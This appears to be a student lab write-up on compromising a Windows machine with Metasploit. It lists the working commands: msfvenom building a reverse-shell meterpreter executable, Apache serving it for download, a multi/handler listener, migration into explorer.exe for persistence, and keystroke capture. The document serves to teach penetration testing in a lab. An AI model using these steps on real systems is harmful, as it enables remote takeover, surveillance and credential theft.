# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


### Find the attackers ip address using ifconfig

## OUTPUT :
![01](https://github.com/user-attachments/assets/21a82c4e-1b29-457f-bd28-268c2d198479)

### Create a malicious executable file fun.exe using msfvenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT :
![02](https://github.com/user-attachments/assets/2442578b-cd17-435f-ad8e-0b8a4ff0b93d)


copy the fun.exe into the apache /var/www/html folder
sudo systemctl apache2 start

## Check the status of apache2

## OUTPUT :
![03](https://github.com/user-attachments/assets/4b8896eb-2ea0-464f-a8c8-58483f1ee6e2)

### Invoke msfconsole:
## OUTPUT:
![04](https://github.com/user-attachments/assets/d0c299a7-87b1-4d24-886c-3b19d2ff3a43)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT :
![05](https://github.com/user-attachments/assets/1f7364e5-4bf2-4828-8a3b-15e1667fd49a)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT :
![RECENT](https://github.com/user-attachments/assets/67c0114c-d3ca-492e-b389-1d49f6e08179)

### WINDOWS :

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads

## BROWSE OUTPUT :
![G1](https://github.com/user-attachments/assets/43d7cf32-b450-4418-a08c-f9188fd381c0)

## DOWNLOAD OUTPUT :
![G2](https://github.com/user-attachments/assets/f3a91341-7e18-4506-949d-5f000dcbe16b)

## COME BACK TO PARROT :

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

## OUTPUT :
![og 06](https://github.com/user-attachments/assets/4833c233-a42b-4102-8504-6d5961a1dc21)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT :
![07](https://github.com/user-attachments/assets/59f16565-bb3c-442e-9589-67c6e338a5f4)
## WINDOWS OUTPUT :
![G3](https://github.com/user-attachments/assets/6732c78a-c58b-4f80-8376-53110e54ebd8)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT :
![09](https://github.com/user-attachments/assets/f9680e07-cab7-4bbc-9975-91c46f3bdd2d)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
